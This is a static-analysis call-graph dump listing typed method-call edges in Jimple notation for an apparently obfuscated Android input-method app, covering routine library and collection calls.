VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap: boolean equals(java.lang.Object)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r4 = staticinvoke <kes: java.lang.String k(nfe)>($r27) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void l(int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lkq: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqr: lsa l()> ==> <lma: lkq k()>
VIRTUAL edge: virtualinvoke $r3.<lli: void c(java.util.Map$Entry)>($r6) in <hbv: void j()> ==> <lli: void c(java.util.Map$Entry)>
SPECIAL edge: specialinvoke r0.<android.app.Application: void <init>()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()> ==> <android.app.Application: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lnc: java.lang.Object next()>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r0) in <ojg: void v(java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
VIRTUAL edge: virtualinvoke $r14.<lkl: void h(java.lang.Object)>($r15) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: void h(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsh: lse h(java.util.logging.Level)>($r2) in <lsh: lsw a(java.util.logging.Level)> ==> <lsh: lse h(java.util.logging.Level)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r2.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r0, $r1, 0, 0) in <lsz: lsz c(java.lang.String,java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.ArrayList: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("tags", $r1, 0) in <lsk: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: $i0 = specialinvoke r0.<ljf: int n()>() in <ljf: java.util.Set f()> ==> <ljf: int n()>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i5) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $r0 = staticinvoke <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>($r1) in <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)> ==> <java.util.TimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
STATIC edge: $i1 = staticinvoke <ql: int a(int[],int,int)>($r1, $i2, 0) in <qj: int j()> ==> <ql: int a(int[],int,int)>
CLINIT edge: staticinvoke <lwa: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwa: void <clinit>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r2) in <ljd: int f(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(6) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "array") in <ql: int a(int[],int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(2) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segments", class "[Lj$/util/concurrent/o;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: $r3 = specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: int z(int,int,int,int)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r28.<mag: void <init>(java.lang.String,int,int)>("TENOR_STICKER_SEARCH_METADATA", 28, 28) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>(4, $i0) in <izw: int ak(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: $r3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>($r3, $r4) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)>
STATIC edge: $r10 = staticinvoke <lum: lvt k()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lum: lvt k()>
CLINIT edge: staticinvoke <coo: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <coo: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r3.<lvs: void <init>(java.lang.String,int)>("DOUBLE", 3) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke r0.<hbv: boolean o()>() in <hbv: void k(java.lang.Object,boolean)> ==> <hbv: boolean o()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r7) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lkf: void <init>()> ==> <lkx: void <init>()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "level") in <lsn: void <init>(java.util.logging.Level)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" component is already registered with a different value.") in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)> ==> <java.lang.Class: java.lang.String getName()>
STATIC edge: $i6 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>($r1, $r2, $r3) in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>(-1640531527) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>
VIRTUAL edge: $c6 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i5) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>("INSTANCE", 0) in <ldr: void <init>()> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>(r0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqn: lsa l()> ==> <lkq: lsb B()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnq: void <init>()> ==> <iec: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int c()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: int hashCode()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r5) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $r1 = staticinvoke <lri: java.lang.Object[] o(java.lang.Object[],int)>($r1, $i0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lri: java.lang.Object[] o(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, $r5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, 0, $r8, 0, $i3) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.String: void <init>(char[],int,int)>($r4, $i1, $i0) in <nzh: boolean f(ivv)> ==> <java.lang.String: void <init>(char[],int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean containsAll(java.util.Collection)>($r4) in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
VIRTUAL edge: $r3 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: java.lang.String getType(android.net.Uri)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljd: java.util.Map m()> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<lts: java.lang.Object e(int)>($i1) in <lsn: boolean ac()> ==> <lsm: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.util.List asList(java.lang.Object[])>($r1) in <ose: void <clinit>()> ==> <java.util.Arrays: java.util.List asList(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Invalid private use tag, other subtag is not empty") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r9) in <lqs: boolean containsAll(java.util.Collection)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: int[] w()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r27 = staticinvoke <java.lang.Float: java.lang.Float valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Float: java.lang.Float valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbv: void <init>(java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsc: boolean g(java.util.logging.Level)>($r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsc: boolean g(java.util.logging.Level)>
SPECIAL edge: specialinvoke $r27.<java.lang.AssertionError: void <init>(java.lang.Object)>("Overflow of RecursionDepth (possible error in core library)") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(4) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfb: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object h(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
STATIC edge: $i3 = staticinvoke <ql: int a(int[],int,int)>($r2, $i2, $i0) in <qj: int i(java.lang.Object,int)> ==> <ql: int a(int[],int,int)>
SPECIAL edge: specialinvoke $r1.<bek: void <init>(java.nio.ByteBuffer)>($r0) in <bel: java.io.InputStream a(java.nio.ByteBuffer)> ==> <bek: void <init>(java.nio.ByteBuffer)>
CLINIT edge: staticinvoke <her: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <her: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void t(int)> ==> <ljd: int[] w()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r14.<lkt: void <init>(int)>($i0) in <lmb: lme f()> ==> <lkt: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<lin: void <init>(ldp,lqd)>($r1, r0) in <lqd: lqd d(ldp)> ==> <lin: void <init>(ldp,lqd)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i2) in <lma: int e(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 65, 90, 32) in <iwt: void f(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljb: void a()> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <liy: int size()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(0) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqr: lsa l()> ==> <lkq: lsb B()>
INTERFACE edge: $z1 = interfaceinvoke $r0.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lqq: void <init>(java.lang.Object,java.lang.Object[],int)> ==> <lkx: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r9 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>($r1) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lsj: void <init>(java.lang.Class)>(class "Ljava/lang/Object;") in <lsl: void <clinit>()> ==> <lsj: void <init>(java.lang.Class)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>($r7, $r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>(0, 0) in <lnd: void <init>(java.lang.Object[])> ==> <lsb: void <init>(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r1) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<lsz: boolean equals(java.lang.Object)>($r6) in <lsn: boolean ac()> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
CLINIT edge: staticinvoke <ljd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljd: void <clinit>()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<ldp: java.lang.Object a(java.lang.Object)>($r4) in <hcb: java.lang.Object l(java.lang.String,ldp)> ==> <hbw: java.lang.Object a(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void a(long,int)>(1L, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void a(long,int)>
CLINIT edge: staticinvoke <lqs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqs: void <clinit>()>
VIRTUAL edge: r0 = virtualinvoke r0.<lqd: lqd d(ldp)>($r1) in <lqd: lqd c()> ==> <lqd: lqd d(ldp)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("%s:%s", $r2) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r1, $r5) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsq: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r0) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lak: void <init>(byte[])> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <ltr: lsz c(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: lsa w(java.lang.Object)>($r2) in <lrg: lsa l()> ==> <izw: lsa w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Collections: java.util.List emptyList()>() in <lvt: void <clinit>()> ==> <java.util.Collections: java.util.List emptyList()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>($r2, $r1, $z0) in <lsh: lse h(java.util.logging.Level)> ==> <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>
